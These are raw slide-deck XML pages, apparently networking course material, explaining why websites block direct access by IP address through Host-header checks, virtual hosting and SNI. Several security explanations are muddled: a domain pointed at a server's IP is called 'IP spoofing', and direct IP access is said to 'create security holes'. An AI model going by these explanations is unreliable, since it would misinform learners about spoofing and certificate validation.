              <a:rPr lang="en-GB" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>http://125.90.204.122</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>, the Host field value is set to the IP address itself. The server for http://www.126.com blocks direct access via IP by checking the Host field. </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>Many websites, such as </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>www.sina.com.cn </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>www.163.com </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>, implement similar restrictions. </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>While some websites may not restrict access via IP addresses, using IP addresses to access websites can be limited by server configurations.</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="zh-CN" sz="1800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="1800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>For example, if you enter </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>http</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>s</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>:// 210.39.4.1, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="1800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>it will </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>not </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="1800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>be redirected to </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>http://www.szu.edu.cn</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1600" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Wingdings 2" panose="05020102010507070707" pitchFamily="18" charset="2"/>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2" name="Rectangle 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="304799" y="152400"/>
            <a:ext cx="11734801" cy="584775"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="3200" b="1" kern="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Why </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="3200" b="1" kern="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Server d</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="3200" b="1" kern="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>o</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="3200" b="1" kern="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>n</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="3200" b="1" kern="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>t </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="3200" b="1" kern="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>allow </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="3200" b="1" kern="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>access </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="3200" b="1" kern="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>to </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="3200" b="1" kern="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>the website directly via </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="3200" b="1" kern="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>IP</a:t>
            </a:r>
            <a:endParaRPr lang="en-US"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
        <p:nvSpPr>
          <p:cNvPr id="6" name="Rectangle 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="76200" y="304800"/>
            <a:ext cx="11761259" cy="461665"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Here's why websites often prevent direct IP access and require domain names:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Rectangle 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="914400"/>
            <a:ext cx="10591800" cy="5446395"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" marR="0">
              <a:lnSpc>
                <a:spcPct val="107000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>1. Security Reasons</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:lnSpc>
                <a:spcPct val="107000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Preventing IP Spoofing Attacks</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0">
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>【防止</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1" dirty="0">
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>IP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0">
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>欺骗攻击】</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257300" lvl="2" indent="-342900">
              <a:lnSpc>
                <a:spcPct val="107000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1000"/>
              <a:buFont typeface="Symbol" panose="05050102010706020507" pitchFamily="18" charset="2"/>
              <a:buChar char=""/>
              <a:tabLst>
                <a:tab pos="457200" algn="l"/>
              </a:tabLst>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Attackers can impersonate servers by pointing fake domains to real IPs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257300" lvl="2" indent="-342900">
              <a:lnSpc>
                <a:spcPct val="107000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1000"/>
              <a:buFont typeface="Symbol" panose="05050102010706020507" pitchFamily="18" charset="2"/>
              <a:buChar char=""/>
              <a:tabLst>
                <a:tab pos="457200" algn="l"/>
              </a:tabLst>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Example: evil.com → 192.0.2.1 (your server's IP)</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257300" lvl="2" indent="-342900">
              <a:lnSpc>
                <a:spcPct val="107000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1000"/>
              <a:buFont typeface="Symbol" panose="05050102010706020507" pitchFamily="18" charset="2"/>
              <a:buChar char=""/>
              <a:tabLst>
                <a:tab pos="457200" algn="l"/>
              </a:tabLst>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Without domain enforcement, users might access the attacker's content</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:lnSpc>
                <a:spcPct val="107000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Mitigating SNI-Based Attacks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257300" lvl="2" indent="-342900">
              <a:lnSpc>
                <a:spcPct val="107000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1000"/>
              <a:buFont typeface="Symbol" panose="05050102010706020507" pitchFamily="18" charset="2"/>
              <a:buChar char=""/>
              <a:tabLst>
                <a:tab pos="457200" algn="l"/>
              </a:tabLst>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Modern HTTPS uses Server Name Indication (SNI) to identify domains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257300" lvl="2" indent="-342900">
              <a:lnSpc>
                <a:spcPct val="107000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1000"/>
              <a:buFont typeface="Symbol" panose="05050102010706020507" pitchFamily="18" charset="2"/>
              <a:buChar char=""/>
              <a:tabLst>
                <a:tab pos="457200" algn="l"/>
              </a:tabLst>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Direct IP access breaks certificate validation, creating security holes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b="1" dirty="0">
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>2. Hosting Multiple Sites (Virtual Hosting)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0">
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>【缓解基于</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1" dirty="0">
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>SNI</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0">
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>的攻击】</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:lnSpc>
                <a:spcPct val="107000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Shared IP Environments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257300" lvl="2" indent="-342900">
              <a:lnSpc>
                <a:spcPct val="107000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1000"/>
              <a:buFont typeface="Symbol" panose="05050102010706020507" pitchFamily="18" charset="2"/>
              <a:buChar char=""/>
              <a:tabLst>
                <a:tab pos="457200" algn="l"/>
              </a:tabLst>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>One IP often hosts dozens of websites (common in cloud hosting)</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257300" lvl="2" indent="-342900">
              <a:lnSpc>
                <a:spcPct val="107000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1000"/>
              <a:buFont typeface="Symbol" panose="05050102010706020507" pitchFamily="18" charset="2"/>
              <a:buChar char=""/>
              <a:tabLst>
                <a:tab pos="457200" algn="l"/>
              </a:tabLst>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>The server decides which site to serve based on the Host header:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:lnSpc>
                <a:spcPct val="107000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:tabLst>
                <a:tab pos="457200" algn="l"/>
              </a:tabLst>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Without Domain Headers : </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Accessing http://203.0.113.45 directly shows:</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257300" lvl="2" indent="-342900">
              <a:lnSpc>
                <a:spcPct val="107000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1000"/>
              <a:buFont typeface="Symbol" panose="05050102010706020507" pitchFamily="18" charset="2"/>
              <a:buChar char=""/>
              <a:tabLst>
                <a:tab pos="457200" algn="l"/>
              </a:tabLst>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
